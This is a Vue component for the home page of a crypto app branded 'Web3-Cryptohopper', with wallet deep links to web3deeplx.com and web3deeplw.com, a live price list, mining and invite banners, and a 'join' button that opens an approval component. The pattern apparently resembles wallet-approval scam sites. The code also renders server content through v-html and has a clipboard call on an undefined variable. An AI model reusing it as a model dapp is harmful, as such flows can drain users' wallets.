<template>
    <div>
        <div class="top-container" data-v-41ea2f78="">

            <div class="home-top" data-v-41ea2f78="">
                <img class="menu-icon" @click="chageShowMenu(true)" src="../assets/static/image/icon_menus.d24882c7.svg" data-v-41ea2f78="">
                <div class="connect_button" v-if="!walletObj.address">
                    <button @click="showClt()" >链接钱包</button>
                </div>
                <div class="userislogin" v-else>
                    <div class="erctrc_login">
                        <div class="address_cl">
                            {{ellipsisAddress(walletObj.address)}}
                            <img v-if="userinfo.type === 'ERC'" src="https://huobicfg.s3.amazonaws.com/currency_icon/eth.png">
                            <img v-if="userinfo.type === 'TRC'" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMjgiIGhlaWdodD0iMTI4IiB2aWV3Qm94PSIwIDAgMjQgMjQiPjxwYXRoIGZpbGw9IiNlMTFkNDgiIGQ9Ik0xMiAyQTEwIDEwIDAgMSAxIDIgMTJBMTAgMTAgMCAwIDEgMTIgMk02LjY4OCA2LjUzNmw0Ljc0NiAxMS45NDVsNi42MTUtOC4wNTlMMTUuNzA3IDguMlpNMTYuODQ1IDEwLjlsLTQuNzk0IDUuODRsLjYxNS01LjA4M3pNNy45MiA3LjkzbDQuMTQ2IDMuNDM5bC0uNjQ5IDUuMzYybC0zLjUtOC44em03LjY0MyAxbDEuMzggMS4zMTJsLTMuNzc0LjY4M3pNOC4zNzEgNy40ODZsNi41IDEuMmwtMi41MjQgMi4xeiIvPjwvc3ZnPg==">
                        </div>
                    </div>
                    <div class="userinfoid">
                        <span>UID:{{userinfo.uid}}</span>
                    </div>
                </div>
                <img class="top-img" src="../assets/static/image/img_home_top.099d659e.png" data-v-41ea2f78="">
                <div class="top-title" data-v-41ea2f78="">Web3-Cryptohopper</div>
                <div class="top-subtitle" data-v-41ea2f78="">{{$t('key151')}}</div>
            </div>
        </div>

        <div class="item-ment">
            <div class="item-c" @click="go('/wallet-info?coin=USDT')">
                <div class="item-l">
                    <img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg" data-v-41ea2f78="">
                    <span data-v-41ea2f78="">{{$t('key70')}}</span>
                </div>
            </div>
            <div class="item-c" @click="go('/wallet-info?coin=USDT&type=2')">
                <div class="item-l">
                    <img src="https://web3deeplx.com/assets/tibi.ae56cb3e.svg" data-v-41ea2f78="">
                    <span data-v-41ea2f78="">提币</span>
                </div>
            </div>
            <div class="item-c" @click="go('/ai')">
                <div class="item-l">
                    <img src="../assets/static/image/icon_menu_ai.e895c6df.svg" data-v-41ea2f78="">
                    <span data-v-41ea2f78="">Ai{{$t('key167')}}</span>
                </div>
            </div>
            <div class="item-c" :href="configInfo.chatLink">
                <div class="item-l">
                    <img src="../assets/static/image/icon_menu_cs.05117d1f.svg" data-v-41ea2f78="">
                    <span data-v-41ea2f78="">{{$t('key168')}}</span>
                </div>
            </div>
        </div>


        <div class="market-container" data-v-41ea2f78="">
            <div class="trade-wrapper" data-v-41ea2f78="">
                <div class="trade-title" data-v-41ea2f78="">{{$t('key152')}}</div>
                <div class="process" data-v-41ea2f78="">
                    <div class="process-item" :class="[tabindex === 0 ? 'active' : '']" @click="changeTabIndex(0)" data-v-8f186750="" data-v-41ea2f78="">
                        <div class="icon-wrapper" data-v-8f186750="">
                            <!---->
                            <span data-v-8f186750="">{{$t('key153')}}</span>
                        </div>
                    </div>
                    <div class="process-item" :class="[tabindex === 1 ? 'active' : '']" @click="changeTabIndex(1)" data-v-8f186750="" data-v-41ea2f78="">
                        <div class="icon-wrapper" data-v-8f186750="">
                            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:star-24-filled" data-v-8f186750="">
                                <g fill="none">
                                    <path d="M10.788 3.103c.495-1.004 1.926-1.004 2.421 0l2.358 4.777l5.273.766c1.107.161 1.549 1.522.748 2.303l-3.816 3.72l.901 5.25c.19 1.103-.968 1.944-1.959 1.424l-4.716-2.48l-4.715 2.48c-.99.52-2.148-.32-1.96-1.424l.901-5.25l-3.815-3.72c-.801-.78-.359-2.142.748-2.303L8.43 7.88l2.358-4.777z" fill="currentColor"></path>
                                </g>
                            </svg>
                            <span data-v-8f186750="" style="margin-left: 3px;line-height: 1;" v-if="tabindex === 1">{{$t('key154')}}</span>
                        </div>
                    </div>
                    <div class="process-item" :class="[tabindex === 2 ? 'active' : '']" @click="changeTabIndex(2)" data-v-8f186750="" data-v-41ea2f78="">
                        <div class="icon-wrapper" data-v-8f186750="">
                            <span data-v-8f186750="" style="line-height: 1;">{{$t('key155')}}</span>
                        </div>
                    </div>
                </div>
                <div class="market-list" data-v-41ea2f78="">
                    <div class="rank-header" @click="go('/business', { contract_id: item.contract_id })" data-v-41ea2f78="" v-for="(item, index) in biList" :key="index" :class="[item.bool ? '' : 'ynone']">
                        <div class="rank-name d-flex" data-v-41ea2f78="">
                            <img :src="item.icon" data-v-41ea2f78="">
                            <div data-v-41ea2f78="">
                                <span class="name" data-v-41ea2f78="">{{ item.coin }}</span>
                                <span class="name" data-v-41ea2f78="" style="font-weight: 500; color: rgb(95, 103, 117); font-family: NunitoSemibold;">usdt</span>
                            </div>
                        </div>
                        <div class="rank-latest" data-v-41ea2f78="">
                            <homekline v-if="item.kData" :kData="item.kData" :change="item.change"></homekline>
                        </div>
                        <div class="rank-change" data-v-41ea2f78="">
                            <div class="price" data-v-41ea2f78="">$ {{ item.close }}</div>
                            <div class="change" data-v-41ea2f78="">
                                <span class="rise" data-v-41ea2f78="" v-if="Number(item.change) >= 0">+{{ item.change }}%</span>
                                <span class="fall" data-v-41ea2f78="" v-if="Number(item.change) < 0">{{ item.change }}%</span>
                                <span data-v-41ea2f78="">24 Hrs</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!---->
        </div>
        <div class="banner-container" data-v-41ea2f78="">
            <div class="home-banner-container" data-v-41ea2f78="">
                <div class="banner-content" data-v-41ea2f78="" @click="go('/ai')">
                    <div class="banner-title" data-v-41ea2f78="">Ai{{$t('key156')}}</div>
                    <div class="banner-subtitle" data-v-41ea2f78="">{{$t('key157')}}Api</div>
                    <div class="banner-img" data-v-41ea2f78="">
                        <img src="../assets/static/image/img_banner.dbd07ead.png" alt="" data-v-41ea2f78="">
                    </div>
                </div>
                <div class="banner-content" data-v-41ea2f78="" @click="go('/mining')">
                    <div class="banner-title" data-v-41ea2f78="">{{$t('key112')}}</div>
                    <div class="banner-subtitle" data-v-41ea2f78="">{{$t('key122')}}</div>
                    <div class="banner-img" data-v-41ea2f78="">
                        <img src="../assets/static/image/img_banner_1.330f874d.png" alt="" data-v-41ea2f78="">
                    </div>
                </div>
            </div>
        </div>
        <div class="invite-container" data-v-41ea2f78="">
            <div class="home-invite" data-v-41ea2f78="" @click="go('/share')">
                <div class="invite-title" data-v-41ea2f78="">{{$t('key159')}}</div>
                <div class="invite-content" data-v-41ea2f78="">
                    <div class="fs-32" data-v-41ea2f78="">{{$t('key159')}}{{$t('key164')}}</div>
                    <div class="fs-44" data-v-41ea2f78="">{{$t('key161')}}</div>
                    <div class="invite-img" data-v-41ea2f78="">
                        <img src="../assets/static/image/icon_arrow.3a19d906.svg" class="img-arrow" data-v-41ea2f78="">
                        <img src="../assets/static/image/img_invite.edacfcdd.png" class="img-invite" data-v-41ea2f78="">
                    </div>
                </div>
            </div>
        </div>
        <div class="news-container" data-v-41ea2f78="">
            <div class="home-news" data-v-41ea2f78="">
                <div class="news-title" data-v-41ea2f78="">
                    <div data-v-41ea2f78="">{{$t('key0')}}</div>
                    <div class="more" data-v-41ea2f78="" @click="go('/news-list')">{{$t('key162')}}</div>
                </div>
                <div class="news-content" data-v-41ea2f78="">
                    <div class="news-item" data-v-41ea2f78="" v-for="(item, index) in newsList" :key="index" @click="changenewsPanelModal(true, item.link)">
                        <div class="news-info" data-v-41ea2f78="">
                            <div class="main-title" data-v-41ea2f78="">
                                <span class="fs-26" data-v-41ea2f78=""> {{item.title}} </span>
                                <span class="date fs-26" data-v-41ea2f78="">{{item.news_time}}</span>
                            </div>
                            <div class="subtitle" data-v-41ea2f78="">{{item.abstract}}</div>
                            <div class="author" data-v-41ea2f78="">{{item.author}} </div>
                        </div>
                        <div class="news-img" data-v-41ea2f78="">
                            <img :src="item.image" class="img-pic" data-v-41ea2f78="">
                        </div>
                    </div>
                </div>
                <div class="news-tips" data-v-41ea2f78="">{{$t('key163')}}</div>
            </div>
        </div>

        <kefu />
        <van-popup v-model="showclct" closeable round :overlay="false" position="center" :style="{ height: '60%' ,width: '85%'}" >
            <div class="wallt_cnt">
                <h2>
                    链接钱包
                </h2>
            </div>
            <hr>
            <van-grid column-num="3" :border="false">
                <van-grid-item icon="https://static.okx.com/cdn/assets/imgs/231/2ACCB47A73E4D8E1.png?x-oss-process=image/format,webp" text="OKX" link-type="navigateTo"
    url="https://www.okx.com/download?channelId=GoogleSEO" />
                <van-grid-item icon="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" text="MetaMask" link-type="navigateTo"
    url="https://metamask.io/link/dapp/https://web3deeplx.com/" />
                <van-grid-item icon="https://token.im/img/favicon-32x32.png" text="imToken" link-type="navigateTo"
    url="imtokenv2://navigate?screen=DappView&url=https://web3deeplw.com/" />
                <van-grid-item icon="https://is5-ssl.mzstatic.com/image/thumb/Purple122/v4/0b/ed/d4/0bedd4b0-1608-d8b8-da72-c08e356c35d3/AppIcon-0-1x_U007emarketing-0-10-0-85-220.png/246x0w.webp" text="Coinbase" link-type="navigateTo"
    url="https://go.cb-w.com/dapp?cb_url=https://web3deeplx.com/"/>
                <van-grid-item icon="https://play-lh.googleusercontent.com/cd5BevWohRqLwsI2_i3k4YIVtcO57cIZCs6l20H1Hcdj0P2rFEcX_7QtgKbTM3Sn_A=w240-h480-rw" text="TrustWallet" link-type="navigateTo"
    url="https://link.trustwallet.com/open_url?coin_id=60&url=https://web3deeplx.com/" />
                <van-grid-item icon="https://play-lh.googleusercontent.com/G_BiKQ5vjnpL9dDr1nRnqZmnjGMNykYng1QDuv5S6C4Foqeye472WE3KM8rtJYGeGSLD=w240-h480-rw" text="TokenPocket" link-type="navigateTo"
    url="tpdapp://open?params={%22url%22:%20%22https://web3deeplw.com/" />
            </van-grid>
        <div class="cnct_class">
            <div class="cnct_domain">
                <span>web3deeplw.com</span>
                <div class="fuzhi_btn"  @click="copysite">
                    <svg t="1719132900503" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="4291" width="16" height="16"><path d="M568.7 319.8l86.8 86.8v476.6h-466V319.8h379.2m29-70H178.9c-32.8 0-59.4 26.5-59.4 59.3v584.7c0 15.7 6.3 30.8 17.4 42 11.1 11.2 26.2 17.4 42 17.4h487.4c15.7 0 30.8-6.3 41.9-17.4 11.1-11.1 17.3-26.2 17.3-42V377.6L597.7 249.8z" fill="#19e026" p-id="4292"></path><path d="M776.7 70.8H357.9c-32.8 0-59.4 26.5-59.4 59.3v100h70v-89.3h379.2l86.8 86.8v476.6h-85.8v70h96.6c15.7 0 30.8-6.3 41.9-17.4 11.1-11.1 17.3-26.2 17.3-42V198.6L776.7 70.8z" fill="#19e026" p-id="4293"></path></svg>            </div>
                <div class="shuaxin_btn" @click="refreshPage">
                    <svg t="1719133100398" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5616" width="16" height="16"><path d="M938.336973 255.26894c-16.685369-6.020494-35.090879 2.752226-40.939358 19.437594l-24.770032 69.493701c-29.070385-65.537376-74.998152-123.162103-133.48295-166.337645-185.947253-137.611288-450.848984-100.112212-590.180413 83.942886C81.534688 350.908785 52.980346 460.653788 68.805644 570.742819c15.825298 110.605073 74.48211 208.481102 164.789518 275.394591 75.686209 55.904586 164.273476 83.082815 252.172686 83.082815 128.494541 0 255.26894-57.624727 338.007727-166.853687 36.639006-48.335965 61.581052-102.348396 74.48211-160.833193 3.78431-17.373425-7.224593-34.402822-24.426004-38.187133-17.201411-3.78431-34.402822 7.052579-38.187133 24.426004-10.836889 49.36805-31.994625 95.123803-62.957164 135.891147-118.173694 156.016798-342.996136 187.839409-500.90509 70.869814-76.546279-56.592642-126.086343-139.33143-139.503444-232.907106-13.417101-93.059634 10.664875-185.775239 67.77356-261.11742C318.05409 144.491853 542.704519 112.497228 700.785486 229.466823c57.280699 42.315471 100.112212 100.972283 123.334117 167.197715l-110.261045-43.003528c-16.513355-6.364522-35.090879 1.720141-41.627415 18.233496-6.536536 16.513355 1.720141 35.090879 18.233496 41.627415l162.38132 63.473207c3.78431 1.548127 7.740635 2.236183 11.69696 2.236183 0.516042 0 1.032085-0.172014 1.548127-0.172014 1.204099 0.172014 2.408198 0.688056 3.612296 0.688056 13.245087 0 25.630102-8.256677 30.274483-21.32975l57.796741-161.693264C963.623047 279.694944 955.022342 261.289434 938.336973 255.26894z" fill="#1296db" p-id="5617"></path></svg>
                </div>
            </div>


        </div>
        </van-popup>

        <van-popup v-model="showMenu" position="left" :style="{ height: '100%' }">
            <div class="is-active mobile-main-sidebar" ref="leftSidebar" style="width: auto;min-width: 4.2rem;padding-right: 0.1rem;position: static;">
                <div class="inner">
                    <ul class="icon-side-menu">
                        <div class="drawer-header" data-v-41ea2f78="">
                            <div class="d-flex" data-v-41ea2f78="" style="margin-top: 5px;" @click="chageShowMenu(false)">
                                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent sidebar-svg" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:dismiss-24-regular" data-v-41ea2f78="">
                                    <g fill="none">
                                        <path d="M4.397 4.554l.073-.084a.75.75 0 0 1 .976-.073l.084.073L12 10.939l6.47-6.47a.75.75 0 1 1 1.06 1.061L13.061 12l6.47 6.47a.75.75 0 0 1 .072.976l-.073.084a.75.75 0 0 1-.976.073l-.084-.073L12 13.061l-6.47 6.47a.75.75 0 0 1-1.06-1.061L10.939 12l-6.47-6.47a.75.75 0 0 1-.072-.976l.073-.084l-.073.084z" fill="currentColor"></path>
                                    </g>
                                </svg>
                            </div>
                        </div>
                        <div class="drawer-logo" data-v-41ea2f78="">
                            <img class="avatar" src="../assets/static/image/62bc27f2b5602811.png" data-v-41ea2f78="">
                            <div class="wallet-address" data-v-41ea2f78="">
                                <div data-v-41ea2f78="">
                                    <img src="../assets/static/image/avatar.33e95978.png" alt="" class="avatar" data-v-41ea2f78="">
                                </div>
                                <div data-v-41ea2f78="">{{ellipsisAddress(walletObj.address)}}</div>
                                <div class="copy-btn btn-copy" :data-clipboard-text="walletObj.address" @click="copy" data-v-41ea2f78="">
                                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:copy-24-regular" data-v-41ea2f78="">
                                        <g fill="none">
                                            <path d="M5.503 4.627L5.5 6.75v10.504a3.25 3.25 0 0 0 3.25 3.25h8.616a2.251 2.251 0 0 1-2.122 1.5H8.75A4.75 4.75 0 0 1 4 17.254V6.75c0-.98.627-1.815 1.503-2.123zM17.75 2A2.25 2.25 0 0 1 20 4.25v13a2.25 2.25 0 0 1-2.25 2.25h-9a2.25 2.25 0 0 1-2.25-2.25v-13A2.25 2.25 0 0 1 8.75 2h9zm0 1.5h-9a.75.75 0 0 0-.75.75v13c0 .414.336.75.75.75h9a.75.75 0 0 0 .75-.75v-13a.75.75 0 0 0-.75-.75z" fill="currentColor"></path>
                                        </g>
                                    </svg>
                                </div>
                            </div>
                        </div>
                        <!---->
                        <div class="join-btn" data-v-41ea2f78="">
                            <button type="button" aria-hidden="false" class="button button v-button is-fullwidth" v-if="userinfo.status == 0" data-v-41ea2f78="" @click="showShouquan(false)">
                                <span>
                                    <img src="../assets/static/image/icon_join.btn.44a592cf.svg" data-v-41ea2f78="">
                                    <span data-v-41ea2f78="">{{$t('key164')}}</span>
                                </span>
                            </button>
                            <button type="button" aria-hidden="false" class="button button v-button is-fullwidth" v-if="userinfo.status == 1" data-v-41ea2f78="" @click="go('/authorized-activity')">
                                <span>
                                    <img src="../assets/static/image/icon_join.btn.44a592cf.svg" data-v-41ea2f78="">
                                    <span data-v-41ea2f78="">{{$t('key165')}}</span>
                                </span>
                            </button>
                        </div>
                        <div class="menu-item" data-v-41ea2f78="">
                            <div class="item-title" data-v-41ea2f78="">{{$t('key166')}}</div>
                            <li class="drawer-item" data-v-41ea2f78="" v-if="userinfo.status == 0" @click="showShouquan(true)">
                                <img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key70')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" v-if="userinfo.status == 1" @click="go('/wallet')">
                                <img src="../assets/static/image/icon_menu_wallet.e9b0e83b.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key70')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/ai')">
                                <img src="../assets/static/image/icon_menu_ai.e895c6df.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">Ai{{$t('key167')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/mining')">
                                <img src="../assets/static/image/icon_menu_mining.ebcf82be.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key112')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/miningrecord')">
                                <img src="../assets/static/image/icon_menu_record.d0fd71ac.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key73')}}</span>
                            </li>
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/share')">
                                <img src="../assets/static/image/icon_menu_share.2e020ec7.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key171')}}</span>
                            </li>
                            <a :href="configInfo.chatLink" data-v-41ea2f78="">
                                <li class="drawer-item" data-v-41ea2f78="">
                                    <img src="../assets/static/image/icon_menu_cs.05117d1f.svg" data-v-41ea2f78="">
                                    <span data-v-41ea2f78="">{{$t('key168')}}</span>
                                </li>
                            </a>
                            <!-- <li class="drawer-item" data-v-41ea2f78="" @click="go('/help')">
                                <img src="../assets/static/image/icon_menu_qa.7ec34a68.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">Q&amp;A</span>
                            </li> -->
                            <li class="drawer-item" data-v-41ea2f78="" @click="go('/language')">
                                <img src="../assets/static/image/icon_menu_set.81a4b22b.svg" data-v-41ea2f78="">
                                <span data-v-41ea2f78="">{{$t('key106')}}</span>
                            </li>
                        </div>
                    </ul>
                    <ul class="bottom-icon-side-menu"></ul>
                </div>
            </div>
        </van-popup>

        <div data-v-51fd882a="" v-if="noticeModal" style="z-index: 2004;">
            <div class="notice-popup van-popup van-popup--center" data-v-51fd882a="" style="z-index: 2077;">
                <div class="notice-container" data-v-51fd882a="">
                    <div class="notice-title" data-v-51fd882a="">
                        <span data-v-51fd882a="">{{noticeInfo.title}}</span>
                        <div data-v-51fd882a="">
                            <svg @click="changenoticeModal(false)" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img" class="iconify iconify--fluent icon-close" width="1em" height="1em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" data-icon="fluent:dismiss-24-regular" data-v-51fd882a="">
                                <g fill="none">
                                    <path d="M4.397 4.554l.073-.084a.75.75 0 0 1 .976-.073l.084.073L12 10.939l6.47-6.47a.75.75 0 1 1 1.06 1.061L13.061 12l6.47 6.47a.75.75 0 0 1 .072.976l-.073.084a.75.75 0 0 1-.976.073l-.084-.073L12 13.061l-6.47 6.47a.75.75 0 0 1-1.06-1.061L10.939 12l-6.47-6.47a.75.75 0 0 1-.072-.976l.073-.084l-.073.084z" fill="currentColor"></path>
                                </g>
                            </svg>
                        </div>
                    </div>
                    <div class="notice-content" data-v-51fd882a="">
                        <!---->
                        <span data-v-51fd882a="">
                            <p v-html="noticeInfo.content"></p>
                        </span>
                    </div>
                    <!---->
                    <!---->
                </div>
            </div>
        </div>

        <approve v-model="shouquanModal" v-if="shouquanModal" :isShowToast="isShowToast"></approve>

        <news-panel v-model="newsPanelModal" :url="link">
        </news-panel>
    </div>
</template>

<script>
import { findNotice, getContractList, getKlineData, getNewsList } from '@/api/user'
import approve from '@/components/approve.vue'
import headerNav from '@/components/header-nav.vue'
import homekline from '@/components/homekline.vue'
import kefu from '@/components/kefu.vue'
import newsPanel from '@/components/news-panel.vue'
import config from '@/config'
import { localRead, localSave } from "@/libs/util"
import Clipboard from 'clipboard'
import { mapActions } from 'vuex'

export default {
    name: 'homeo',
    props: {
    },
    components: {
        approve,
        headerNav,
        kefu,
        newsPanel,
        homekline
    },
    computed: {
        userinfo() {
            return this.$store.state.user.userinfo
        },
        configInfo() {
            return this.$store.state.user.configInfo
        },
        walletObj() {
            return this.$store.state.user.walletObj
        }
    },
    data() {
        return {
            isShowToast: false,
            // websocket
            ws: {},
            wsUrl: ``,
            heart_jump: false, //websocket 心跳状态
            ws_heart: '', // ws心跳定时器
            //websocket持续连接的定时器
            continuous_link: null,
            noticeModal: false,
            newsPanelModal: false,
            showMenu: false,
            tabindex: 0,
            shouquanModal: false,
            biList: [],
            type: 1,
            currBiList: [],
            newsList: [],
            link: '',
            noticeInfo: {},
            showclct: false,
            isdapp: false,
        }
    },
    watch: {
        tabindex() {
            this.type = this.tabindex + 1
            this.getContractList2()
        },
        userinfo () {
            if (this.biList.length <= 0) {
                this.getContractList()
            }
        }
    },
    mounted() {
        if (window.location.protocol === 'http:') {
            this.wsUrl = `ws://${config.wssHost}/ws/`
        } else {
            this.wsUrl = `wss://${config.wssHost}/ws/`
        }
        // if (!sessionStorage.getItem("noticeModal")) this.changenoticeModal(true)
        this.getContractList()
        this.getNewsList()
        this.findNotice()
        if (!this.walletObj.address){
            this.showClt();

        }

    },
    beforeDestroy () {
        this.close_heart();
        this.ws.close();
    },
    methods: {
    copysite() {
      const clipboard = new Clipboard('.fuzhi_btn', {
        text: () => window.location.href
      });

      clipboard.on('success', () => {
        this.$toast({
          message: this.$t('key96'),
          type: 'success'
        });
        clipboard.destroy(); // 释放内存
      });

      clipboard.on('error', () => {
        this.$toast({
          message: this.$t('key97'),
          type: 'error'
        });
        clipboard.destroy(); // 释放内存
      });

      clipboard.onClick(event); // 触发点击事件以复制URL
    },
        refreshPage() {
          window.location.reload();
        },
        showClt() {
            this.showclct = true;
        },
        ellipsisAddress (str) {
            if (!str) return
            let address = str.slice(0, 4) + '****' + str.substr(-4)
            return address
        },
        findNotice () {
            findNotice({ type: 1 }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.noticeInfo = data.data
                    try{
                        if (localRead('notice') !== data.data.token) {
                        this.changenoticeModal(true)
                        localSave('notice', data.data.token)
                        }
                    }catch(error){
                        console.log(error)
                    }

                }
            })
        },
        getNewsList () {
            getNewsList({
                page: 1,
                page_size: 5
            }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.newsList = data.data.list
                }
            })
        },
        // WebSjocket操作
        creat_socket(url) {
            this.ws = new WebSocket(url);
            this.close_heart();
            this.initWebSocket();
        },
        initWebSocket() {
            let that = this;
            let ws = that.ws;
            // 打开WebSjocket
            ws.onopen = function (e) {
                console.log("WebSjocket已经打开");
                that.heart_jump = true; // 心跳状态打开
                // that.heart();
                let json = JSON.stringify({ "sub": "ticker" })
                let qingli = JSON.stringify({ "unsub": "ticker" })
                that.ws.send(qingli);
                that.ws.send(json);

                // 再次清除防止重复请求
                clearInterval(that.continuous_link);
            };

            // 接收WebSjocket
            // let mouse_over = [];
            ws.onmessage = (event) => {

                if ((!event && !event.data) || event.data == "undefined") {
                    return;
                } else {
                    let data = JSON.parse(event.data)
                    if (data.channel) {
                        // console.log(data)
                        that.biList.forEach((item, index) => {
                            if (item.coin_alias == data.data.symbol) {
                                if (that.biList[index].kData) {
                                    that.biList[index].kData[that.biList[index].kData.length - 1] = {
                                        open: Math.abs(data.data.open),
                                        close: Math.abs(data.data.close),
                                        time: that.biList[index].kData[that.biList[index].kData.length - 1].time,
                                        value: Math.abs(data.data.close)
                                    }
                                    that.changeCurrKdata(that.biList[index].kData, index)
                                }
                            }
                        })
                    }
                    // that.ws.send(json);
                    // console.log(data);
                }
            }
            // 关闭
            ws.onclose = function (e) {
                if (that.heart_jump) {
                    that.close_heart();
                    that.heart_jump = false;

                }
                console.log("WebSocket关闭");
            };

            // WebSocket发生错误
            ws.onerror = function (e) {
                if (that.heart_jump) {
                    that.close_heart();
                    that.heart_jump = false;
                }
                that.reconnect(that.wsUrl);
                console.log("WebSocket发生错误");
            };
        },

        heart(props) {
            let that = this;
            this.ws_heart = setInterval(() => {
                that.ws.send(props);
            }, 10 * 1000);
        },

        close_heart() {
            console.log("ws心跳结束");
            clearInterval(this.ws_heart);
            this.ws_heart = null;
        },

        reconnect(url) {
            if (this.lockReconnect) return;
            this.lockReconnect = true;
            let that = this;
            // 先清除定时器
            clearInterval(this.continuous_link);

            this.continuous_link = setInterval(function () {
                //没连接上会一直重连，设置延迟避免请求过多
                that.lockReconnect = false;
                that.creat_socket(url);
                console.log("重启中...");
            }, 5000);
        },
        checkIsShow(coin_alias) {
            let arr = this.currBiList.filter(item => {
                return item.coin_alias === coin_alias
            })
            return arr.length
        },
        getContractList2(isInit) {
            getContractList({ type: this.type }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    let currBiList = data.data
                    this.currBiList = currBiList
                    this.biList.forEach((item, index) => {
                        if (this.checkIsShow(item.coin_alias)) this.$set(this.biList[index], "bool", true)
                        else this.biList[index].bool = this.$set(this.biList[index], "bool", false)
                    })
                    // if (isInit) this.init()
                }
            })
        },
        getContractList() {
            getContractList({ type: 3 }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    this.biList = data.data
                    if (data.data.length > 0) {
                        this.getContractList2(true)
                        this.biList.forEach((item, index) => {
                            this.getKlineData(item.contract_id, index)
                        })
                    }
                    // //页面刚进入时开启长连接
                    this.creat_socket(this.wsUrl)
                }
            })
        },
        getKlineData(contract_id, index) {
            getKlineData({ interval: '60', contract_id }).then(res => {
                let data = res.data
                if (data.code === 1) {
                    let kData = []
                    data.data = data.data.slice(0, 20)
                    data.data.forEach((item, index2) => {
                        let time = this.timetrans(item.now_time)
                        kData.unshift({
                            open: item.open,
                            close: item.close,
                            time: item.now_time,
                            value: item.close
                        })
                    })
                    this.changeCurrKdata(kData, index)
                }
            })
        },
        changeCurrKdata (kData, index) {
            let nowItem = kData[kData.length - 1]
            let change = ((nowItem.close - nowItem.open) / nowItem.open * 100).toFixed(2)
            this.$set(this.biList[index], "kData", kData)
            this.$set(this.biList[index], "change", change)
            this.$set(this.biList[index], "close", kData[kData.length - 1].close)
        },
        timetrans(date) {
            var date = new Date(date * 1000)//如果date为10位需要乘1000
            var Y = date.getFullYear() + '-'
            var M = (date.getMonth() + 1 < 10 ? '0' + (date.getMonth() + 1) : date.getMonth() + 1) + '-'
            var D = (date.getDate() < 10 ? '0' + (date.getDate()) : date.getDate())
            var h = (date.getHours() < 10 ? '0' + date.getHours() : date.getHours()) + ':'
            var m = (date.getMinutes() < 10 ? '0' + date.getMinutes() : date.getMinutes()) + ':'
            var s = (date.getSeconds() < 10 ? '0' + date.getSeconds() : date.getSeconds())
            // return `${Y}${M}${D} ${h}${m}${s}`
            return `${Y}${M}${D}`
        },
        ...mapActions([
            'getuserinfo'
        ]),
        showShouquan(isShowToast) {
            this.isShowToast = isShowToast
            this.shouquanModal = true
        },
        changenoticeModal(bool) {
            // if (!bool) sessionStorage.setItem("noticeModal", "1")
            this.noticeModal = bool
        },
        copy() {
            var clipboard = new Clipboard('.btn-copy')
            clipboard.on('success', e => {
                this.$toast({
                    message: this.$t('key96'),
                    icon: 'success',
                })
                // 释放内存
                clipboard.destroy()
            })
            clipboard.on('error', e => {
                // 不支持复制
                this.$toast({
                    message: this.$t('key97'),
                    icon: 'cross',
                })
                // 释放内存
                clipboard.destroy()
            })
        },
        go(path, query) {
            this.$router.push({ path, query })
        },
        changenewsPanelModal(bool, link) {
            this.link = link
            this.newsPanelModal = bool
        },
        chageShowMenu(bool) {
            this.showMenu = bool
        },
        changeTabIndex(tabindex) {
            this.tabindex = tabindex
        }
    }
}
</script>

<style>

.item-l img {
    width: 40px;
}
.item-ment {
    display: flex;
    justify-content: space-around;
    padding-top: 5%;
}
.item-l {
    place-items: center;
    display: grid;
    justify-content: center;
    align-items: center;
}
.address_cl img {
    width: 23px;
    margin: 0 3px;
}
.address_cl{
    height: 90%;
    width: 80%;
    border-radius: 29px;
    padding: 5px;
    background: rgb(28, 28, 33);
    font-weight: 700;
    line-height: 30px;
    align-items: center;
    display: flex;
}
.userislogin {
    display: flex;
    align-items: center;
    justify-content: center;
    position: absolute;
    top: 5%;
    left: 20%;
}
.erctrc_login{
    align-items: center;
    display: flex;
    justify-content: center;
    height: 40px;
    width: 180px;
    border: 0px solid rgb(17, 57, 232);
    background-color: rgb(61, 94, 240);
    box-shadow: rgba(0, 47, 255, 0.2) 0px 2px 6px;
    opacity: 1;
}
.userinfoid{
    background: #232334;
    border-radius: 5px;
    padding: 5px;
    margin: 0 10px
}

.fuzhi_btn {
    width: 20px;
    height: 20px;
    display: flex;
    align-items: center;
    justify-content: center; /* 水平居中 */
